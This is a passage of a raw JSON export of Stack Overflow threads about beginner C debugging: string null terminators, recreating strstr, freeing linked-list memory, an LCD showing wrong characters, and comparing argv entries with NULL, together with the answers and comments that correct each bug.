not using 5 characters, it's using 6 characters, <code>'a','p','p','l', 'e' + 'null'</code> therefore putting 00000000 aka '\\0' in the last byte.\nso here is the code that would work in c: </p>\n\n<pre><code>// assuming string A = 'apple'\nint count = 0;\nwhile (A[count] != '\\0')\n{\n  n++;\n}\n</code></pre>\n\n<p>so i tried the following code in python, it did not work, what went wrong?</p>\n\n<pre><code>A = 'apple'\ncount = 0\nwhile A[count] != '\\0':\n    count+=1\n\nprint(count)\n</code></pre>\n\n<p>Note: the point here is not to get the length, the point is how do i get the length using while != 00000000</p>\n\n<p>Additional Note: how does python store strings in memory, does it put 00000000 in the end like c does? if it doesn't ,lets say i put a 00000000 in memory using c, then how do i find that 00000000 in memory with python?</p>\n"}, {"tags": ["c", "string", "pointers", "strstr"], "comments": [{"owner": {"reputation": 10359, "user_id": 1216776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/504692de390dabd9ca22fd716e178993?s=128&d=identicon&r=PG", "display_name": "stark", "link": "https://stackoverflow.com/users/1216776/stark"}, "edited": false, "score": 2, "creation_date": 1551886906, "post_id": 55026624, "comment_id": 96806559, "body": "Once you increment needle, you can&#39;t try to match again."}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 1, "creation_date": 1551886969, "post_id": 55026624, "comment_id": 96806592, "body": "You should also get rid of the <code>strlen</code> calls from within the loop.  You should be able to get the original lengths once, outside the loop, then adjust the lengths as needed inside the loop without iterating over and over."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 1, "creation_date": 1551887428, "post_id": 55026624, "comment_id": 96806872, "body": "What&#39;s the point for <code>buffer</code>? Consider for a moment why <code>strstr</code> doesn&#39;t need one?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1551887988, "post_id": 55026624, "comment_id": 96807223, "body": "@d827 <code>buffer</code> is absolutely not necessary for the driver code. If you want to recreate <code>strstr</code>the signature of <code>myStrStr</code> should be identical to the one of the original <code>strstr</code>."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1551888131, "post_id": 55026624, "comment_id": 96807323, "body": "@d827 for testing <code>myStrStr</code> you compare the return values of <code>myStrStr</code> to the return value of <code>strstr</code> for different testcases."}], "answers": [{"tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 1, "last_activity_date": 1551889571, "creation_date": 1551889571, "answer_id": 55027838, "question_id": 55026624, "link": "https://stackoverflow.com/questions/55026624/recreating-strstr/55027838#55027838", "title": "Recreating strstr()", "body": "<p>The function is broken in multiple ways.</p>\n\n<p>Here is a corrected version:</p>\n\n<pre><code>int myStrStr(const char *haystack, const char *needle, char *buffer) {\n    if (*needle == '\\0') {\n        /* special case for empty needle: return success with an empty match */\n        buffer[0] = '\\0';\n        return 1;\n    }\n    for (; *haystack != '\\0'; haystack++) {\n        if (*haystack == *needle) {\n            buffer[0] = *haystack;\n            for (size_t i = 1;; i++) {\n                buffer[i] = needle[i];\n                if (needle[i] == '\\0')\n                    return 1;\n                if (needle[i] != haystack[i])\n                    break;\n            }\n        }\n    }\n    buffer[0] = '\\0';\n    return 0;\n}\n</code></pre>\n\n<p>Note that copying the matched string while you scan is unnecessary, it would be sufficient to copy the needle once a match is found. As a matter of fact, the contents of <code>buffer</code> is either an empty string or a copy of <code>needle</code>: not a very useful side effect.</p>\n"}], "owner": {"reputation": 79, "user_id": 10559791, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1a776402423e006cd3a14135c4748460?s=128&d=identicon&r=PG&f=1", "display_name": "d827", "link": "https://stackoverflow.com/users/10559791/d827"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 284, "favorite_count": 0, "accepted_answer_id": 55027838, "answer_count": 1, "score": 0, "last_activity_date": 1551889571, "creation_date": 1551886010, "last_edit_date": 1551888924, "question_id": 55026624, "link": "https://stackoverflow.com/questions/55026624/recreating-strstr", "title": "Recreating strstr()", "body": "<p>My goal is to recreate <code>strstr</code> in a C function named <code>myStrStr</code> that returns a <code>1</code> if the substring is found in the haystack and a <code>0</code> if it is not, all while copying the matched substring into a buffer.</p>\n\n<p>I tried writing the following code to solve this, and I'm unsure of why it doesn't produce the desired result when it is compiled and run.</p>\n\n<pre><code>int myStrStr(char *haystack, char *needle, char *buffer) {\n    int i = 1;\n    char *k = (haystack + i);\n    for (; *haystack != '\\0'; haystack++) {\n        if (*haystack == *needle) {\n            buffer[0] = *haystack;\n            for (; *needle != '\\0'; needle++) {\n                if (*needle = *k) {\n                    buffer[i] = *k;\n                    i++;\n                    printf(\"%d\\n\", i);\n                } else\n                if (strlen(buffer) == strlen(needle)) {\n                    return 1;\n                } else {\n                    buffer[0] = 0;\n                }\n            }\n        }\n    }\n    return 0;\n}\n</code></pre>\n\n<p>an example of the driver code is as follows:</p>\n\n<pre><code>int myStrStr(char[], char[], char[]);\n\nchar haystack[][20] = { \"chocolate\", \"vanilla\", \"caramel\", \"strawberry\", \"banana\", \"cherry\" };\n    char needle[][20] = { \"choc\", \"lla\", \"am\", \"strawberry\", \"na\", \"terrible\" };\n    char buffer[255];\n\nprintf(\"\\n\\t=========Test #1: myStrStr with '%s' and substring '%s'===========\\n\\n\", haystack[0], needle[0]);\nint result = myStrStr(haystack[0],needle[0],buffer);\nassert(result == 1&amp;&amp; strcmp(needle[0], buffer) == 0);\nprintf(\"\\n\\t\\t....Test Passed\\n\");\n\nprintf(\"\\n\\t=========Test #2: myStrStr with '%s' and substring '%s'===========\\n\\n\", haystack[1], needle[1]);\nresult = myStrStr(haystack[1],needle[1],buffer);\nassert(result == 1 &amp;&amp; strcmp(needle[1], buffer) == 0);\nprintf(\"\\n\\t\\t....Test Passed\\n\");\n</code></pre>\n\n<p>Thanks</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 480272, "user_id": 1968, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/fdd630f72eef3790bfb4ef38d08c7f85?s=128&d=identicon&r=PG", "display_name": "Konrad Rudolph", "link": "https://stackoverflow.com/users/1968/konrad-rudolph"}, "edited": false, "score": 0, "creation_date": 1551886128, "post_id": 55026252, "comment_id": 96806051, "body": "Your code already contains a bug because of your <code>free(n)</code> inside the loop in <code>readWords</code>."}, {"owner": {"reputation": 75, "user_id": 10534413, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35d1ed7a8a0466fc0c4d67a101f5c334?s=128&d=identicon&r=PG&f=1", "display_name": "AHunt", "link": "https://stackoverflow.com/users/10534413/ahunt"}, "reply_to_user": {"reputation": 704, "user_id": 7364588, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b06a987d5dffc629dd7d33dd80bf567?s=128&d=identicon&r=PG&f=1", "display_name": "user7364588", "link": "https://stackoverflow.com/users/7364588/user7364588"}, "edited": false, "score": 0, "creation_date": 1551886376, "post_id": 55026252, "comment_id": 96806201, "body": "@Alrick If I do that, valgrind gives me a message that I did an invalid free"}, {"owner": {"reputation": 704, "user_id": 7364588, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b06a987d5dffc629dd7d33dd80bf567?s=128&d=identicon&r=PG&f=1", "display_name": "user7364588", "link": "https://stackoverflow.com/users/7364588/user7364588"}, "edited": false, "score": 0, "creation_date": 1551887275, "post_id": 55026252, "comment_id": 96806772, "body": "@AHunt yes whet i said is wrong, i was following your logic because your were freeing the node each time. But KonradRudolph is right, your code is bugged"}, {"owner": {"reputation": 75, "user_id": 10534413, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35d1ed7a8a0466fc0c4d67a101f5c334?s=128&d=identicon&r=PG&f=1", "display_name": "AHunt", "link": "https://stackoverflow.com/users/10534413/ahunt"}, "edited": false, "score": 0, "creation_date": 1551887936, "post_id": 55026252, "comment_id": 96807188, "body": "But where should the free go if it is not supposed to be in readWords?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1551889206, "post_id": 55026252, "comment_id": 96807988, "body": "You don&#39;t provide following functions: <code>sortList</code> and <code>reportWords</code> and you don&#39;t provide the definition of <code>Node</code>, so it&#39;s almost impossible to help you. The origin or your problem might be in the code you didn &#39;t show. Please <a href=\"https://stackoverflow.com/posts/55026252/edit\">edit</a>  your question and provide a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 75, "user_id": 10534413, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35d1ed7a8a0466fc0c4d67a101f5c334?s=128&d=identicon&r=PG&f=1", "display_name": "AHunt", "link": "https://stackoverflow.com/users/10534413/ahunt"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1551890542, "post_id": 55026252, "comment_id": 96808789, "body": "@Jabberwocky The problem is that the system is not letting me list all the code since they are saying there is too much code. How would I post all the code?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1551890647, "post_id": 55026252, "comment_id": 96808840, "body": "That&#39;s why you should provide a <b>Minimal</b> example. Of course this requires some work."}, {"owner": {"reputation": 75, "user_id": 10534413, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35d1ed7a8a0466fc0c4d67a101f5c334?s=128&d=identicon&r=PG&f=1", "display_name": "AHunt", "link": "https://stackoverflow.com/users/10534413/ahunt"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1551890749, "post_id": 55026252, "comment_id": 96808905, "body": "@Jabberwocky What do you mean? If you want the whole code, how would I minimize it?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1551890824, "post_id": 55026252, "comment_id": 96808952, "body": "@AHunt read this link: <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>. They explain what to do."}, {"owner": {"reputation": 75, "user_id": 10534413, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35d1ed7a8a0466fc0c4d67a101f5c334?s=128&d=identicon&r=PG&f=1", "display_name": "AHunt", "link": "https://stackoverflow.com/users/10534413/ahunt"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1551891102, "post_id": 55026252, "comment_id": 96809123, "body": "@Jabberwocky   Just updated the code - added the functions you asked for."}, {"owner": {"reputation": 75, "user_id": 10534413, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35d1ed7a8a0466fc0c4d67a101f5c334?s=128&d=identicon&r=PG&f=1", "display_name": "AHunt", "link": "https://stackoverflow.com/users/10534413/ahunt"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1551899629, "post_id": 55026252, "comment_id": 96813587, "body": "Let us <a href=\"https://chat.stackoverflow.com/rooms/189550/discussion-between-ahunt-and-jabberwocky\">continue this discussion in chat</a>."}, {"owner": {"reputation": 75, "user_id": 10534413, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35d1ed7a8a0466fc0c4d67a101f5c334?s=128&d=identicon&r=PG&f=1", "display_name": "AHunt", "link": "https://stackoverflow.com/users/10534413/ahunt"}, "edited": false, "score": 0, "creation_date": 1551910960, "post_id": 55026252, "comment_id": 96818705, "body": "Problem resolved"}], "answers": [{"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 2, "last_activity_date": 1551895226, "creation_date": 1551895226, "answer_id": 55029500, "question_id": 55026252, "link": "https://stackoverflow.com/questions/55026252/how-to-free-allocated-memory-in-this-block-of-c-code/55029500#55029500", "title": "How to free allocated memory in this block of C code?", "body": "<p>You've got two main problems, both in the <code>readWords</code>:</p>\n\n<pre><code>while ( true ) {\n    ...\n    Node *n = (Node *) malloc( sizeof( Node ) );\n    ...\n\n    if ( len == 0 ) {\n       return list;\n    }\n\n    n-&gt;next = list;\n\n    list = n;\n\n    free(n);\n}\n\nfclose(fp);\n</code></pre>\n\n<p>You populate a node, add that node to the list, then you immediately free that node making invalid.  Later, when you attempt to read the list, you invoked <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\">undefined behavior</a> by dereferencing a pointer to memory that has already been freed.  You're already freeing the list at the end of <code>main</code> so no need to do it here.  </p>\n\n<p>That leaves you with a couple of dangling memory leaks.  When you reach the end of the file,  the <code>len == 0</code> check is true so you immediately return from the function.  This leaves the most recent node you allocated (which contains nothing) as a leak, and you don't close <code>fp</code>.  You can fix this by freeing <code>n</code> inside of the <code>if</code> block and using  <code>break</code> to get out of the loop, and moving the <code>return</code> statement after <code>fclose</code>.</p>\n\n<pre><code>while ( true ) {\n    ...\n    Node *n = (Node *) malloc( sizeof( Node ) );\n    ...\n\n    if ( len == 0 ) {\n        free(n);\n        break;\n    }\n\n    n-&gt;next = list;\n    list = n;\n}\n\nfclose(fp);\nreturn list;\n</code></pre>\n"}], "owner": {"reputation": 75, "user_id": 10534413, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35d1ed7a8a0466fc0c4d67a101f5c334?s=128&d=identicon&r=PG&f=1", "display_name": "AHunt", "link": "https://stackoverflow.com/users/10534413/ahunt"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 91, "favorite_count": 0, "accepted_answer_id": 55029500, "answer_count": 1, "score": -1, "last_activity_date": 1551895226, "creation_date": 1551884858, "last_edit_date": 1551891042, "question_id": 55026252, "link": "https://stackoverflow.com/questions/55026252/how-to-free-allocated-memory-in-this-block-of-c-code", "title": "How to free allocated memory in this block of C code?", "body": "<p>I am running valgrind on my code and it shows that I did not free my memory when I used malloc. I tried to free it but it gives me the same message. Any suggestions on how this might be fixed? </p>\n\n<p>Thanks!</p>\n\n<pre><code>/** \n* Read all the words from the given file, an return them as a\n* linked list.\n*/\nNode *readWords( char *filename )\n{\n    FILE *fp = fopen( filename, \"r\" );\n\n    if ( !fp ) {\n        fprintf( stderr, \"Can't open file: %s\\n\", filename );\n        usage();\n    }\n\n    Node *list = NULL;\n\n    while ( true ) {\n        int ch = fgetc( fp );\n\n        while ( ch != EOF &amp;&amp; ! wordChar( ch ) )\n            ch = fgetc( fp );\n\n        Node *n = (Node *) malloc( sizeof( Node ) );\n\n        int len = 0;\n        while ( wordChar( ch ) ) {\n            if ( len &lt; WORD_MAX )\n                n-&gt;word[ len++ ] = toLower( ch );\n\n            ch = fgetc( fp );\n        }\n\n        n-&gt;word[ len ] = '\\0';\n\n        if ( len == 0 ) {\n           return list;\n        }\n\n        n-&gt;next = list;\n\n        list = n;\n\n        free(n);\n    }\n\n    fclose(fp);\n}\n</code></pre>\n\n<pre><code>\nint main( int argc, char *argv[] )\n{\n  if ( argc != 2 )\n    usage();\n\n  Node *list = readWords( argv[ 1 ] );\n  list = sortList( list );\n\n  reportWords( list );\n\n  while (list) {\n\n     Node *next = list-&gt;next;\n     free( list );\n       list = next;\n  }\nreturn EXIT_SUCCESS;\n}\n</code></pre>\n\n<p>Here is the part where I free the nodes after I use them in the list.</p>\n\n<pre><code>/** Insertion sort on a linked list. */\nNode *sortList( Node *list )\n{\n  Node *newList = NULL;\n\n  while ( list ) {\n\n    Node *n = list;\n    list = list-&gt;next;\n\n    Node **target = &amp;newList;\n    while ( *target &amp;&amp; strcmp( n-&gt;word, (*target)-&gt;word ) &gt;= 0 )\n      target = &amp;(*target)-&gt;next;\n\n    n-&gt;next = *target;\n    *target = n;\n  }\n\n  return newList;\n}\n</code></pre>\n\n<p>Here is the part where it gets sorted.</p>\n\n<pre><code>/** Given a sorted list, report the number of occurrences of each word. */\nvoid reportWords( Node *list )\n{\n  Node *n = list;\n  while ( n ) {\n    Node *end = n-&gt;next;\n    int ocount = 0;\n    while ( end &amp;&amp; strcmp( n-&gt;word, end-&gt;word ) == 0 ) {\n      end = end-&gt;next;\n      ocount++;\n    }\n    printf( \"%s (%d)\\n\", n-&gt;word, ocount );\n    n = end;\n  }\n}\n</code></pre>\n\n<p>Here is the function where it reports the words(prints them out).</p>\n"}, {"tags": ["c", "cortex-m", "lcd", "texas-instruments"], "answers": [{"comments": [{"owner": {"reputation": 23, "user_id": 10718751, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-pk0Is-xVtbw/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-h4xmDrnrg1CJGM-kc7C2K_bp9T-Q/mo/photo.jpg?sz=128", "display_name": "Andy ", "link": "https://stackoverflow.com/users/10718751/andy"}, "edited": false, "score": 1, "creation_date": 1551885705, "post_id": 55026366, "comment_id": 96805803, "body": "Thanks so much, indeed i was connecting something wrong, now it works correctly"}], "tags": [], "owner": {"reputation": 58292, "user_id": 34824, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/ri8DI.jpg?s=128&g=1", "display_name": "abelenky", "link": "https://stackoverflow.com/users/34824/abelenky"}, "is_accepted": true, "score": 1, "last_activity_date": 1551885215, "creation_date": 1551885215, "answer_id": 55026366, "question_id": 55026216, "link": "https://stackoverflow.com/questions/55026216/wrong-values-are-displayed-on-lcd/55026366#55026366", "title": "Wrong values are displayed on LCD", "body": "<p>Lets look at what your examples have in common:</p>\n\n<pre><code>'N' == 0100 1110\n'L' == 0100 1100\n\n'2' == 0011 0010\n'3' == 0011 0011\n'0' == 0011 0000\n</code></pre>\n\n<p>The problem always seems to be 2nd lowest bit.<br>\nAnd sometimes the lowest bit. (in the case of <code>'3'</code> turning into <code>'0'</code>),</p>\n\n<p>I conclude you have some bad wiring connection near the lowest bits of communication from your board to the LCD screen.</p>\n"}], "owner": {"reputation": 23, "user_id": 10718751, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-pk0Is-xVtbw/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-h4xmDrnrg1CJGM-kc7C2K_bp9T-Q/mo/photo.jpg?sz=128", "display_name": "Andy ", "link": "https://stackoverflow.com/users/10718751/andy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 50, "favorite_count": 0, "accepted_answer_id": 55026366, "answer_count": 1, "score": 2, "last_activity_date": 1551885215, "creation_date": 1551884729, "last_edit_date": 1551884820, "question_id": 55026216, "link": "https://stackoverflow.com/questions/55026216/wrong-values-are-displayed-on-lcd", "title": "Wrong values are displayed on LCD", "body": "<p>I'm using Tiva c to drive an LCD but some characters and numbers are wrong displayed, for example, N is displayed as L, 2 and 3 are displayed as 0 but other characters and letters are displayed correctly.</p>\n\n<p>Here is the function that displays characters:</p>\n\n<pre><code>void LCD_voidWriteCharacter(char Character)\n{\n    SET_BIT(GPIO_PORTA_DATA_R, 7); // RS pin is 1 -&gt; data\n    GPIO_PORTB_DATA_R = Character; \n    SET_BIT(GPIO_PORTA_DATA_R, 5); // Enable is high (latch)\n    Delay_ms(2);\n    CLEAR_BIT(GPIO_PORTA_DATA_R, 5); // Enable is low\n}\n</code></pre>\n\n<p>where could be the problem? \nsorry for my english</p>\n"}, {"tags": ["c", "for-loop", "multidimensional-array"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1551883970, "post_id": 55025820, "comment_id": 96804659, "body": "It looks as though you are trying to replicate the way program arguments are passed to <code>int main(int argc, char *argv[])</code> but they are not like what you are doing."}, {"owner": {"reputation": 1126, "user_id": 7678543, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/780b5ce4ef85fc4c423c16f5b67d84ca?s=128&d=identicon&r=PG", "display_name": "MikNiller", "link": "https://stackoverflow.com/users/7678543/mikniller"}, "edited": false, "score": 0, "creation_date": 1551884115, "post_id": 55025820, "comment_id": 96804739, "body": "&#39;\\0&#39; is similar to (char)0 = a char that has value 0. This is used to terminate a C string, it is not the same as NULL which is a pointer to memory location 0"}, {"owner": {"reputation": 18385, "user_id": 1773434, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/9HhFs.png?s=128&g=1", "display_name": "Govind Parmar", "link": "https://stackoverflow.com/users/1773434/govind-parmar"}, "reply_to_user": {"reputation": 1126, "user_id": 7678543, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/780b5ce4ef85fc4c423c16f5b67d84ca?s=128&d=identicon&r=PG", "display_name": "MikNiller", "link": "https://stackoverflow.com/users/7678543/mikniller"}, "edited": false, "score": 1, "creation_date": 1551884187, "post_id": 55025820, "comment_id": 96804791, "body": "@MikNiller - Technically both <code>&#39;\\0&#39;</code> and <code>NULL</code> have the numeric value zero on many systems, but I agree, do not mix them up"}, {"owner": {"reputation": 61, "user_id": 11041995, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-hTSjVGR9IHo/AAAAAAAAAAI/AAAAAAAAA7I/CjMzxCsjHSM/photo.jpg?sz=128", "display_name": "Mike", "link": "https://stackoverflow.com/users/11041995/mike"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1551884210, "post_id": 55025820, "comment_id": 96804807, "body": "@WeatherVane I did so because <a href=\"http://pythontutor.com/c.html#mode=edit\" rel=\"nofollow noreferrer\">pythontutor.com/c.html#mode=edit</a> appears not to have a way to pass arguments to main. How should I declare the array?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1551884372, "post_id": 55025820, "comment_id": 96804912, "body": "As I wrote: <code>int main(int argc, char *argv[])</code> please see <a href=\"https://stackoverflow.com/questions/3734111/what-are-the-arguments-to-main-for\">What are the arguments to main() for?</a> Edit: oh I see, the web page doesn&#39;t let you."}, {"owner": {"reputation": 61, "user_id": 11041995, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-hTSjVGR9IHo/AAAAAAAAAAI/AAAAAAAAA7I/CjMzxCsjHSM/photo.jpg?sz=128", "display_name": "Mike", "link": "https://stackoverflow.com/users/11041995/mike"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1551884657, "post_id": 55025820, "comment_id": 96805101, "body": "@WeatherVane But isn&#39;t that the same if I would set the argc to the number of arguments, and argv to the actual content of arguments?  And pass those to the function ft_concat_params? Edit: gotcha"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1551884758, "post_id": 55025820, "comment_id": 96805168, "body": "No: please read the link, there are two additional array elements. <code>argv[0]</code> is a pointer to the program name, <code>argv[argc]</code> is <code>NULL</code>."}], "answers": [{"comments": [{"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 2, "creation_date": 1551884133, "post_id": 55025913, "comment_id": 96804753, "body": "in fact the value is not used before to be set so <code>char *res;</code> is enough. But upvode also because your icon is perfect to explain what you probably think when you see the error ^^"}], "tags": [], "owner": {"reputation": 58292, "user_id": 34824, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/ri8DI.jpg?s=128&g=1", "display_name": "abelenky", "link": "https://stackoverflow.com/users/34824/abelenky"}, "is_accepted": false, "score": 6, "last_activity_date": 1551883923, "creation_date": 1551883923, "answer_id": 55025913, "question_id": 55025820, "link": "https://stackoverflow.com/questions/55025820/why-cant-i-evaluate-array-to-null-in-a-for-loop/55025913#55025913", "title": "Why can&#39;t I evaluate &quot;array to NULL&quot; in a for loop?", "body": "<p>This line:</p>\n\n<pre><code>char *res = 'NULL'; \n</code></pre>\n\n<p>Does NOT initialize the pointer to NULL.\nRather, it sets to some strange, non-sensical 32-bit value.</p>\n\n<p>You want to start with</p>\n\n<pre><code>char *res = NULL;  // NOTE:  No single-quotes around it.\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 516, "user_id": 8953248, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c6d360d2c181948145b0922208be7949?s=128&d=identicon&r=PG&f=1", "display_name": "Ray Butterworth", "link": "https://stackoverflow.com/users/8953248/ray-butterworth"}, "is_accepted": false, "score": 1, "last_activity_date": 1551885977, "creation_date": 1551885977, "answer_id": 55026613, "question_id": 55025820, "link": "https://stackoverflow.com/questions/55025820/why-cant-i-evaluate-array-to-null-in-a-for-loop/55026613#55026613", "title": "Why can&#39;t I evaluate &quot;array to NULL&quot; in a for loop?", "body": "<pre><code>the first I don't understand is argv[a][b] != NULL\n</code></pre>\n\n<ul>\n<li>argv has type (char **)</li>\n<li>argv[a] has type (char *)</li>\n<li>argv[a][b] has type (char)</li>\n</ul>\n\n<p>Comparing argv[a][b] with NULL is comparing a char with a pointer, which is not allowed because it doesn't make sense.</p>\n"}, {"comments": [{"owner": {"reputation": 61, "user_id": 11041995, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-hTSjVGR9IHo/AAAAAAAAAAI/AAAAAAAAA7I/CjMzxCsjHSM/photo.jpg?sz=128", "display_name": "Mike", "link": "https://stackoverflow.com/users/11041995/mike"}, "edited": false, "score": 0, "creation_date": 1551893423, "post_id": 55026846, "comment_id": 96810619, "body": "From what I have learned so far, and tested: char *argv[] == char **argv , or does that only apply with the main function?"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 61, "user_id": 11041995, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-hTSjVGR9IHo/AAAAAAAAAAI/AAAAAAAAA7I/CjMzxCsjHSM/photo.jpg?sz=128", "display_name": "Mike", "link": "https://stackoverflow.com/users/11041995/mike"}, "edited": false, "score": 0, 